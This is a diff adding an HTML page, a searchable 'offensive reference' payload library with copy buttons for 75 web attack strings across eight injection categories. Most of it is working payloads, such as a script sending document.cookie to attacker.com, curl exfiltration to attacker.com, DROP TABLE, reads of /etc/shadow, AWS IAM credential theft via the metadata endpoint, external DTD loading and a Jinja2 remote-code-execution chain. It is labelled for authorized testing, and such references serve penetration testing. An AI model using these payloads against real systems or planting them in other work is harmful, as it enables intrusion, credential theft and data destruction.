@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payload Library — Temple Tools</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #0a0a0c; --bg2: #0d0d10; --bg3: #111116;
+  --c: #ff4d4d; --c-dim: rgba(255,77,77,0.08); --c-mid: rgba(255,77,77,0.3);
+  --gold: #c8a96e; --text: #f5f2ec;
+  --text-dim: rgba(245,242,236,0.5); --text-faint: rgba(245,242,236,0.2);
+  --border: rgba(255,255,255,0.06); --border-c: rgba(255,77,77,0.2);
+  --mono: 'Share Tech Mono', monospace; --head: 'Rajdhani', sans-serif;
+  --red: #ff4d4d; --green: #00ff88; --orange: #ff7722; --yellow: #ffd700;
+  --cyan: #00c8ff; --teal: #00d4aa; --purple: #bf7fff;
+}
+html { scroll-behavior: smooth; }
+body { font-family: var(--head); background: var(--bg); color: var(--text); overflow-x: hidden; min-height: 100vh; }
+nav {
+  position: sticky; top: 0; z-index: 100;
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 1rem 2.5rem; background: rgba(10,10,12,0.92); backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border-c);
+}
+.nav-back { font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.12em; color: var(--c); text-decoration: none; transition: opacity 0.2s; }
+.nav-back:hover { opacity: 0.7; }
+.nav-center { font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.3em; color: var(--text-faint); text-transform: uppercase; }
+.nav-right { font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.2em; color: var(--c); text-transform: uppercase; }
+
+.hero { padding: 4.5rem 2.5rem 3.5rem; text-align: center; border-bottom: 1px solid var(--border-c); }
+.hero-label { font-family: var(--mono); font-size: 0.68rem; letter-spacing: 0.3em; color: var(--c); text-transform: uppercase; margin-bottom: 1.2rem; }
+.hero-title {
+  font-size: clamp(2.4rem, 5.5vw, 4.5rem); font-weight: 700; letter-spacing: 0.08em;
+  text-transform: uppercase; line-height: 1; color: var(--c);
+  text-shadow: 0 0 40px rgba(255,77,77,0.4); animation: glitch 5s infinite;
+}
+@keyframes glitch {
+  0%,91%,100% { text-shadow: 0 0 40px rgba(255,77,77,0.4); transform: none; }
+  92% { text-shadow: -2px 0 rgba(255,77,77,0.9), 2px 0 rgba(0,200,255,0.3); transform: skewX(-1deg); }
+  93% { text-shadow: 2px 0 rgba(255,77,77,0.9), -2px 0 rgba(0,200,255,0.3); transform: skewX(0.5deg); }
+  94% { text-shadow: 0 0 40px rgba(255,77,77,0.4); transform: none; }
+}
+.hero-sub { font-family: var(--mono); font-size: 0.8rem; letter-spacing: 0.15em; color: var(--text-dim); margin-top: 1rem; }
+.hero-stats { display: flex; justify-content: center; gap: 3rem; margin-top: 2rem; flex-wrap: wrap; }
+.stat { text-align: center; }
+.stat-val { font-family: var(--mono); font-size: 2rem; color: var(--c); display: block; }
+.stat-lbl { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--text-faint); }
+
+.main { max-width: 1100px; margin: 0 auto; padding: 2rem 1.5rem 5rem; }
+
+/* Search & filter bar */
+.search-wrap {
+  position: sticky; top: 56px; z-index: 90;
+  background: var(--bg); border-bottom: 1px solid var(--border); padding: 0.75rem 0;
+  margin-bottom: 1.5rem;
+}
+.search-input {
+  width: 100%; background: var(--bg2); border: 1px solid var(--border-c);
+  color: var(--text); font-family: var(--mono); font-size: 0.9rem;
+  padding: 0.7rem 1rem; outline: none; transition: border-color 0.2s; letter-spacing: 0.03em;
+}
+.search-input:focus { border-color: var(--c); }
+.search-input::placeholder { color: var(--text-faint); }
+.filter-tabs { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-top: 0.75rem; }
+.filter-tab {
+  font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase;
+  padding: 0.3rem 0.75rem; border: 1px solid var(--border); background: var(--bg2);
+  color: var(--text-dim); cursor: pointer; transition: all 0.15s;
+}
+.filter-tab:hover { border-color: var(--c); color: var(--c); }
+.filter-tab.active { border-color: var(--c); color: var(--c); background: var(--c-dim); }
+
+/* Cards */
+.cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(420px, 1fr)); gap: 1rem; }
+.payload-card { background: var(--bg2); border: 1px solid var(--border); position: relative; overflow: hidden; }
+.payload-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, var(--c-mid), transparent); }
+.card-header { display: flex; align-items: center; gap: 0.75rem; padding: 0.8rem 1rem 0; }
+.cat-badge {
+  font-family: var(--mono); font-size: 0.55rem; letter-spacing: 0.15em; text-transform: uppercase;
+  padding: 0.2rem 0.55rem; border: 1px solid; border-radius: 2px;
+}
+.cat-xss      { color: var(--red);    border-color: rgba(255,77,77,0.4);    background: rgba(255,77,77,0.07);    }
+.cat-sqli     { color: var(--orange); border-color: rgba(255,119,34,0.4);   background: rgba(255,119,34,0.07);   }
+.cat-cmdi     { color: var(--yellow); border-color: rgba(255,215,0,0.4);    background: rgba(255,215,0,0.07);    }
+.cat-path     { color: var(--teal);   border-color: rgba(0,212,170,0.4);    background: rgba(0,212,170,0.07);    }
+.cat-ssrf     { color: var(--cyan);   border-color: rgba(0,200,255,0.4);    background: rgba(0,200,255,0.07);    }
+.cat-xxe      { color: var(--purple); border-color: rgba(191,127,255,0.4);  background: rgba(191,127,255,0.07);  }
+.cat-ssti     { color: var(--green);  border-color: rgba(0,255,136,0.4);    background: rgba(0,255,136,0.07);    }
+.cat-redirect { color: var(--gold);   border-color: rgba(200,169,110,0.4);  background: rgba(200,169,110,0.07);  }
+.card-desc { font-family: var(--mono); font-size: 0.62rem; color: var(--text-faint); margin-left: auto; }
+.card-code { margin: 0.6rem 1rem; background: var(--bg3); border: 1px solid var(--border); padding: 0.65rem 0.8rem; overflow-x: auto; }
+.card-code pre { font-family: var(--mono); font-size: 0.72rem; color: var(--text); white-space: pre-wrap; word-break: break-all; }
+.card-footer { display: flex; align-items: center; justify-content: flex-end; padding: 0 1rem 0.8rem; }
+.copy-btn {
+  font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase;
+  padding: 0.25rem 0.75rem; border: 1px solid var(--border-c); background: none; color: var(--c);
+  cursor: pointer; transition: all 0.2s;
+}
+.copy-btn:hover { background: var(--c-dim); border-color: var(--c); }
+.copy-btn.copied { background: var(--c-dim); border-color: var(--c); }
+
+.no-results { font-family: var(--mono); font-size: 0.8rem; color: var(--text-faint); text-align: center; padding: 3rem; }
+
+footer { text-align: center; padding: 1.5rem; font-family: var(--mono); font-size: 0.62rem; color: var(--text-faint); letter-spacing: 0.12em; border-top: 1px solid var(--border); }
+
+@media (max-width: 600px) {
+  nav { padding: 1rem 1.25rem; }
+  .hero { padding: 3rem 1.25rem 2.5rem; }
+  .hero-stats { gap: 1.5rem; }
+  .main { padding: 1.5rem 0.75rem 4rem; }
+  .search-wrap { top: 52px; padding: 0.6rem 0.75rem; }
+  .cards-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-back" href="index.html">← tools</a>
+  <span class="nav-center">temple tools</span>
+  <span class="nav-right">payloads</span>
+</nav>
+
+<div class="hero">
+  <div class="hero-label">// temple tools — offensive reference</div>
+  <div class="hero-title">PAYLOADS</div>
+  <div class="hero-sub">xss · sqli · cmdi · path traversal · ssrf · xxe · ssti · open redirect</div>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-val" id="total-count">75</span><span class="stat-lbl">Total Payloads</span></div>
+    <div class="stat"><span class="stat-val" id="visible-count">75</span><span class="stat-lbl">Showing</span></div>
+    <div class="stat"><span class="stat-val">8</span><span class="stat-lbl">Categories</span></div>
+  </div>
+</div>
+
+<div class="main">
+  <div class="search-wrap">
+    <input class="search-input" id="search-input" type="text" placeholder="Search payloads..." oninput="filterPayloads()" spellcheck="false">
+    <div class="filter-tabs" id="filter-tabs"></div>
+  </div>
+
+  <div class="cards-grid" id="cards-grid"></div>
+  <div class="no-results" id="no-results" style="display:none;">No payloads match your search.</div>
+</div>
+
+<footer>temple tools — payload library &nbsp;·&nbsp; for authorized testing only &nbsp;·&nbsp; <a href="index.html" style="color:var(--c);text-decoration:none;">← all tools</a></footer>
+
+<script>
+const PAYLOADS = [
+  // XSS
+  { cat:'XSS', payload:`<script>alert(1)<\/script>`, desc:'Basic XSS' },
+  { cat:'XSS', payload:`<img src=x onerror=alert(1)>`, desc:'Image onerror' },
+  { cat:'XSS', payload:`<svg onload=alert(1)>`, desc:'SVG onload' },
+  { cat:'XSS', payload:`"><img src=x onerror=alert(document.domain)>`, desc:'Attribute breakout' },
+  { cat:'XSS', payload:`<iframe src="javascript:alert(1)">`, desc:'JS protocol iframe' },
+  { cat:'XSS', payload:`<body onload=alert(1)>`, desc:'Body onload' },
+  { cat:'XSS', payload:`<input autofocus onfocus=alert(1)>`, desc:'Focus event' },
+  { cat:'XSS', payload:`<details open ontoggle=alert(1)>`, desc:'HTML5 toggle' },
+  { cat:'XSS', payload:`javascript:alert(1)`, desc:'Protocol handler' },
+  { cat:'XSS', payload:`<script>fetch('https://attacker.com/'+document.cookie)<\/script>`, desc:'Cookie theft' },
+  { cat:'XSS', payload:`'><script>alert(document.domain)<\/script>`, desc:'Quote breakout' },
+  { cat:'XSS', payload:`<svg><script>alert(1)<\/script></svg>`, desc:'SVG script' },
+  { cat:'XSS', payload:`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, desc:'Base64 eval' },
+  { cat:'XSS', payload:`<a href="javascript:alert(1)">click</a>`, desc:'Href JS' },
+  { cat:'XSS', payload:`\\u003cscript\\u003ealert(1)\\u003c/script\\u003e`, desc:'Unicode encoded' },
+  { cat:'XSS', payload:`<script>alert(String.fromCharCode(88,83,83))<\/script>`, desc:'Char codes' },
+  { cat:'XSS', payload:`<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">`, desc:'Meta refresh' },
+  // SQLi
+  { cat:'SQLi', payload:`' OR '1'='1`, desc:'Auth bypass' },
+  { cat:'SQLi', payload:`' OR '1'='1' --`, desc:'Auth bypass with comment' },
+  { cat:'SQLi', payload:`'; DROP TABLE users; --`, desc:'DROP TABLE' },
+  { cat:'SQLi', payload:`' UNION SELECT null,null,null --`, desc:'UNION probe' },
+  { cat:'SQLi', payload:`' UNION SELECT table_name,null FROM information_schema.tables --`, desc:'Table enumeration' },
+  { cat:'SQLi', payload:`' AND 1=1 --`, desc:'Boolean true' },
+  { cat:'SQLi', payload:`' AND 1=2 --`, desc:'Boolean false' },
+  { cat:'SQLi', payload:`' AND SLEEP(5) --`, desc:'Time-based blind (MySQL)' },
+  { cat:'SQLi', payload:`'; WAITFOR DELAY '0:0:5' --`, desc:'Time-based blind (MSSQL)' },
+  { cat:'SQLi', payload:`' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --`, desc:'Error-based MSSQL' },
+  { cat:'SQLi', payload:`' AND extractvalue(1,concat(0x7e,(SELECT version()))) --`, desc:'Error-based MySQL extractvalue' },
+  { cat:'SQLi', payload:`1' ORDER BY 1 --`, desc:'Column count probe' },
+  { cat:'SQLi', payload:`1' GROUP BY 1,2,3 --`, desc:'Group by enumeration' },
+  { cat:'SQLi', payload:`' HAVING 1=1 --`, desc:'HAVING clause injection' },
+  { cat:'SQLi', payload:`admin'--`, desc:'Simple comment bypass' },
+  { cat:'SQLi', payload:`' OR SLEEP(5)#`, desc:'MySQL time blind with hash comment' },
+  { cat:'SQLi', payload:`' UNION SELECT username,password FROM users --`, desc:'Credential extraction' },
+  { cat:'SQLi', payload:`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --`, desc:'Blind boolean char extraction' },
+  // CMDi
+  { cat:'CMDi', payload:`; ls -la`, desc:'Semicolon injection (Unix)' },
+  { cat:'CMDi', payload:`| id`, desc:'Pipe injection' },
+  { cat:'CMDi', payload:`&& cat /etc/passwd`, desc:'AND chaining' },
+  { cat:'CMDi', payload:`$(id)`, desc:'Command substitution' },
+  { cat:'CMDi', payload:'`whoami`', desc:'Backtick substitution' },
+  { cat:'CMDi', payload:`; ping -c 3 attacker.com`, desc:'Out-of-band ICMP' },
+  { cat:'CMDi', payload:`\\n/bin/sh`, desc:'Newline injection' },
+  { cat:'CMDi', payload:`%0a cat /etc/shadow`, desc:'URL-encoded newline' },
+  { cat:'CMDi', payload:`| curl http://attacker.com/$(whoami)`, desc:'OOB exfil via curl' },
+  { cat:'CMDi', payload:`; powershell -c "whoami"`, desc:'Windows PowerShell injection' },
+  { cat:'CMDi', payload:`& dir`, desc:'Windows AND operator' },
+  { cat:'CMDi', payload:`| type C:\\Windows\\System32\\drivers\\etc\\hosts`, desc:'Windows file read' },
+  // PATH
+  { cat:'PATH', payload:`../../../etc/passwd`, desc:'Basic directory traversal' },
+  { cat:'PATH', payload:`..\\..\\..\\ Windows\\System32\\drivers\\etc\\hosts`, desc:'Windows traversal' },
+  { cat:'PATH', payload:`....//....//....//etc/passwd`, desc:'Double-dot filter bypass' },
+  { cat:'PATH', payload:`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`, desc:'URL encoded traversal' },
+  { cat:'PATH', payload:`%252e%252e%252f`, desc:'Double URL encoded' },
+  { cat:'PATH', payload:`..%c0%afetc%c0%afpasswd`, desc:'UTF-8 overlong encoding' },
+  { cat:'PATH', payload:`/var/www/images/../../../etc/shadow`, desc:'Absolute path with traversal' },
+  { cat:'PATH', payload:`php://filter/convert.base64-encode/resource=/etc/passwd`, desc:'PHP stream wrapper' },
+  // SSRF
+  { cat:'SSRF', payload:`http://169.254.169.254/latest/meta-data/`, desc:'AWS IMDSv1 metadata' },
+  { cat:'SSRF', payload:`http://metadata.google.internal/computeMetadata/v1/`, desc:'GCP metadata endpoint' },
+  { cat:'SSRF', payload:`http://localhost:22`, desc:'Local SSH port probe' },
+  { cat:'SSRF', payload:`http://127.0.0.1:6379`, desc:'Redis internal check' },
+  { cat:'SSRF', payload:`http://[::1]:80`, desc:'IPv6 localhost' },
+  { cat:'SSRF', payload:`http://0.0.0.0:8080`, desc:'Alt localhost notation' },
+  { cat:'SSRF', payload:`file:///etc/passwd`, desc:'File protocol read' },
+  { cat:'SSRF', payload:`http://169.254.169.254/latest/meta-data/iam/security-credentials/`, desc:'AWS IAM credential exfil' },
+  // XXE
+  { cat:'XXE', payload:`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`, desc:'Basic file read' },
+  { cat:'XXE', payload:`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/ssrf">]><root>&xxe;</root>`, desc:'SSRF via XXE' },
+  { cat:'XXE', payload:`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>`, desc:'External DTD inclusion' },
+  { cat:'XXE', payload:`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>`, desc:'Shadow file read' },
+  { cat:'XXE', payload:`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>`, desc:'PHP filter wrapper XXE' },
+  // SSTI
+  { cat:'SSTI', payload:`{{7*7}}`, desc:'Generic probe (Jinja2/Twig)' },
+  { cat:'SSTI', payload:`${'{7*7}'}`, desc:'Freemarker / Thymeleaf probe' },
+  { cat:'SSTI', payload:`<%= 7*7 %>`, desc:'ERB / JSP probe' },
+  { cat:'SSTI', payload:`{{config}}`, desc:'Jinja2 config dump' },
+  { cat:'SSTI', payload:`{{''.__class__.__mro__[1].__subclasses__()}}`, desc:'Jinja2 class chain' },
+  { cat:'SSTI', payload:`{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}`, desc:'Jinja2 RCE via subprocess' },
+  { cat:'SSTI', payload:`#{7*7}`, desc:'Ruby / Pebble probe' },
+  // REDIRECT
+  { cat:'REDIRECT', payload:`//evil.com`, desc:'Protocol-relative redirect' },
+  { cat:'REDIRECT', payload:`https://trusted.com@evil.com`, desc:'At-sign bypass' },
+  { cat:'REDIRECT', payload:`https://trusted.com%2f@evil.com`, desc:'Encoded slash bypass' },
+  { cat:'REDIRECT', payload:`//evil%E3%80%82com`, desc:'Unicode dot bypass' },
+  { cat:'REDIRECT', payload:`javascript:alert(1)`, desc:'JS protocol open redirect' },
+  { cat:'REDIRECT', payload:`/\\evil.com`, desc:'Backslash redirect (IE/Edge)' },
+];
+
+const CATS = ['ALL','XSS','SQLi','CMDi','PATH','SSRF','XXE','SSTI','REDIRECT'];
+const CAT_KEY = { XSS:'xss', SQLi:'sqli', CMDi:'cmdi', PATH:'path', SSRF:'ssrf', XXE:'xxe', SSTI:'ssti', REDIRECT:'redirect' };
+
+let activeCat = 'ALL';
+
+// Build filter tabs
+document.getElementById('filter-tabs').innerHTML = CATS.map(c =>
+  `<button class="filter-tab${c==='ALL'?' active':''}" onclick="setCat('${c}')">${c} <span style="opacity:0.5;font-size:0.55rem;">(${c==='ALL'?PAYLOADS.length:PAYLOADS.filter(p=>p.cat===c).length})</span></button>`
+).join('');
+
+function setCat(cat) {
+  activeCat = cat;
+  document.querySelectorAll('.filter-tab').forEach((el, i) => {
+    el.classList.toggle('active', CATS[i] === cat);
+  });
+  filterPayloads();
+}
+
+function filterPayloads() {
+  const q = document.getElementById('search-input').value.toLowerCase();
+  const filtered = PAYLOADS.filter(p => {
+    const catMatch = activeCat === 'ALL' || p.cat === activeCat;
+    const textMatch = !q || p.payload.toLowerCase().includes(q) || p.desc.toLowerCase().includes(q) || p.cat.toLowerCase().includes(q);
+    return catMatch && textMatch;
+  });
+
+  document.getElementById('visible-count').textContent = filtered.length;
+  document.getElementById('total-count').textContent = PAYLOADS.length;
+
+  const grid = document.getElementById('cards-grid');
+  const none = document.getElementById('no-results');
+
+  if (!filtered.length) {
+    grid.innerHTML = '';
+    none.style.display = 'block';
+    return;
+  }
+  none.style.display = 'none';
+
+  grid.innerHTML = filtered.map((p, idx) => {
+    const cls = 'cat-' + (CAT_KEY[p.cat] || p.cat.toLowerCase());
+    const globalIdx = PAYLOADS.indexOf(p);
+    return `
+      <div class="payload-card">
+        <div class="card-header">
+          <span class="cat-badge ${cls}">${p.cat}</span>
+          <span class="card-desc">${escHtml(p.desc)}</span>
+        </div>
+        <div class="card-code"><pre>${escHtml(p.payload)}</pre></div>
+        <div class="card-footer">
+          <button class="copy-btn" id="copybtn-${globalIdx}" onclick="copyPayload(${globalIdx})">Copy</button>
+        </div>
+      </div>`;
+  }).join('');
+}
+
+function copyPayload(idx) {
+  navigator.clipboard.writeText(PAYLOADS[idx].payload).then(() => {
+    const btn = document.getElementById('copybtn-' + idx);
+    if (!btn) return;
+    btn.textContent = '✓ COPIED';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+filterPayloads();
+</script>
+</body>
+</html>
